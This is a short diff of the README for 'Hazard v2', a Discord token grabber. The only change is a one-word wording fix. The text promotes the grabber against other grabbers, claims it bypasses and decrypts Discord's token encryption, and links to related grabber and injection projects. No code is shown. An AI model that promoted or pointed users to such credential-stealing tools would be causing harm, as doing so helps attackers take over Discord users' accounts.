@@ -106,7 +106,7 @@ config = {
 ---
   
 ## <a id="why_hazard"></a>🔎 〢 Why choose Hazard v2?
-You might be wondering, Why choose this grabber instead of other ones like [Mercurial](https://github.com/NightfallGT/Mercurial-Grabber) or [ItroublveTSC](https://github.com/Itroublve/ItroublveTSC). Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-bug, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a [injection](https://github.com/Rdimo/Discord-Injection) which also currently is the only working one.
+You might be wondering, Why choose this grabber instead of other ones like [Mercurial](https://github.com/NightfallGT/Mercurial-Grabber) or [ItroublveTSC](https://github.com/Itroublve/ItroublveTSC). Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a [injection](https://github.com/Rdimo/Discord-Injection) which also currently is the only working one.
 
 Here are some pros and cons why/why not use Hazard v2 instead of other ones
   
